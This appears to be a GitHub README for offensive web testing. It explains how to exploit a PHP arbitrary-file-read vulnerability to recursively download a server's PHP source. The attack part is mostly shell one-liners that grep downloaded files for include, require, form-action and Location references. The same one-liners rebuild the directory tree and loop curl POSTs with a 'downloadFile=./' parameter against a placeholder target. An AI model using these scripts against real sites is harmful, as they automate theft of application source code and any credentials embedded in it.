# Extract PHP files

<img width="1005" alt="1" src="https://github.com/nowak0x01/Code-Review/assets/96009982/c67fc7ed-2727-44c5-9425-e8ab4dc93d93"><br>

You have discovered a vulnerability that enables you to read internal server files, similar to the `readfile($input)` function in PHP.

To exploit this vulnerability, you dump the sitemap of your Burp Suite, and then filter all the `.php` files to download them.

However, be aware that these files might also include or reference other `.php` files in various ways, such as through `include`, `require`, `href`, `form action`, `require_once`, comments, etc.

Searching for these references one by one is not the most efficient and can become tedious. In this context, regular expressions (regex) prove to be incredibly useful.


## Example<br>

Currently, you possess knowledge of the files `index.php`, `auth.php`, and `redirect.php` which were extracted from the Burp Suite sitemap.

However, it's crucial to note that these files also reference unknown internal files in various ways, utilizing functions like `include()`, `require_once()`, `Location`, `form action`, and more.

Thankfully, by employing regular expressions (regex), you can easily extract all the referenced files and uncover further insights.

<img width="1005" alt="1" src="https://github.com/nowak0x01/Code-Review/assets/96009982/99b04175-bc22-498c-a63f-a0a566014358"><br>

## Steps
1. Extract all the referenced files.
2. Extract all the directories and create them on your local machine.
3. Download all the files using the wordlist "_php-files."
4. Continuously searching for more referenced .php files, until there are no more .php files left to download.
   
Note: You will see that you will have no more php files to download when the "_php-verify" file is empty or with garbage


```sh
# 1°
grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | awk -F'.php:' '{print $2}' | cut -d"'" -f2 | cut -d'"' -f2 | sort -u > _php-files

# 2°
for _dir in $(cat _php-files);do dirname $_dir ;done | sort -u | xargs -I@ sh -c "mkdir -p $PWD/@"

# 3°
for _file in $(cat _php-files);do curl -Lsk https://example.com/ -XPOST -d "downloadFile=./$_file" -o "$PWD/$_file"; done

# 4°
grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | awk -F'.php:' '{print $2}' | cut -d"'" -f2 | cut -d'"' -f2 | sort -u > _php-files
rm _php-verify; for _file in $(cat _php-files);do find * | grep -w "$_file" || printf "\n$_file" >> _php-verify ; done
rm _php-check; for _dir in $(grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | grep -wEv "_php-files|_php-verify" | awk -F'.php:' '{print $1}' | xargs -I@ sh -c "dirname @" 2>&- | sort -u); for _file in $(cat _php-verify);do printf "\n$_dir/$_file"; done | sort -u >> _php-check
for _dir in $(sort -u _php-check);do dirname $_dir ;done | sort -u | xargs -I@ sh -c "mkdir -p $PWD/@"
for _file in $(sort -u _php-check);do curl -Lsk https://example.com/ -XPOST -d "downloadFile=./$_file" -o "$PWD/$_file"; done
```
